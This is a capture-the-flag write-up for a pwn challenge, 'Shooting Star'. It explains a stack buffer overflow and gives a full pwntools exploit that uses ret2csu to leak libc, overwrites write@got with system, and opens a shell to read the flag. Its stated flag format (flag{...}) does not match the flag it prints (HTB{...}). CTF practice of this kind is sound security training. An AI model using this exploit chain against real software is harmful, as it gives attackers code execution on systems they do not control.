---
title: "Shooting Star"
ctf: "CTF Challenge"
date: 2026-06-07
category: pwn
difficulty: easy
flag_format: "flag{...}"
---

# Shooting Star

## Summary

A 64-bit ELF binary with no canary, no PIE, and Partial RELRO. A buffer overflow in the `star()` function (reads 512 bytes into a 64-byte buffer via option "Make a wish!"). Uses `ret2csu` to control `rdx` (needed because libc write clobbers it to 1), leaks libc, performs a GOT overwrite (`write@got` → `system`), and spawns a shell via `system("/bin/sh")`.

## Solution

### Step 1: Analyze the binary

```
checksec: No canary, No PIE, Partial RELRO, NX enabled
Functions: main, setup, star
Vulnerability: star() reads 0x200 bytes into buffer at rbp-0x40 (64 bytes)
Gadgets: pop rdi; ret (0x4012cb), pop rsi; pop r15; ret (0x4012c9)
ret2csu: pop rbx/rbp/r12-r15 at 0x4012c2, call gadget at 0x4012a8
```

### Step 2: Exploit

Libc write clobbers `rdx` to 1 after returning, so direct PLT calls can't set the count. `ret2csu` solves this by loading `rdx` from `r14` before an indirect `call` through a GOT entry.

**Stage 1 — Leak:** Use `ret2csu` to call `write(1, read@got, 8)` (sets `rdx = r14 = 8` via the CSU gadget). This outputs the resolved libc address of `read`.

**Stage 2 — GOT overwrite:** Use `ret2csu` to call `read(0, write@got, 16)` (sets `rdx = r14 = 16`). Send `p64(system) + b"/bin/sh\0"` — the system address overwrites `write@got`, and the string overwrites `read@got`. Then `pop rdi; read@got; write_plt` calls `system("/bin/sh")`.

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

POP_RBX_RBP_R12_R13_R14_R15_RET = 0x4012c2
CSU_CALL = 0x4012a8
WRITE_PLT = 0x401030
READ_PLT = 0x401040
READ_GOT = 0x404020
WRITE_GOT = 0x404018
POP_RDI_RET = 0x4012cb
MAIN = 0x401230

elf = ELF('./challenge/shooting_star')
libc = ELF('/usr/lib/libc.so.6')

def csu_call(rbx, rbp, r12, r13, r14, r15, after):
    before = flat([POP_RBX_RBP_R12_R13_R14_R15_RET,
                   rbx, rbp, r12, r13, r14, r15, CSU_CALL])
    return before + flat([0]*7) + after

p = process('./challenge/shooting_star')

# Stage 1: leak
p.recv(0x5b); p.send(b'1'); p.recv(3)
p.send(b'A'*64 + b'B'*8 + csu_call(0,1, 1,READ_GOT,8,WRITE_GOT, flat([MAIN])))
p.recvuntil(b'\nMay your wish come true!\n')
libc.address = u64(p.recv(8).ljust(8, b'\x00')) - libc.symbols['read']
log.success(f'libc: {hex(libc.address)}')
system = libc.symbols['system']

# Stage 2: GOT overwrite + shell
p.recv(0x5b); p.send(b'1'); p.recv(3)
p.send(b'A'*64 + b'B'*8 + csu_call(0,1, 0,WRITE_GOT,16,READ_GOT,
    flat([POP_RDI_RET, READ_GOT, WRITE_PLT])))
import time; time.sleep(0.3)
p.send(p64(system) + b'/bin/sh\x00')
time.sleep(0.2)
p.sendline(b'id; cat flag.txt')
print(p.recvall(timeout=2).decode(errors='replace'))
```

## Flag

```
HTB{1_w1sh_pwn_w4s_th1s_e4sy}
```
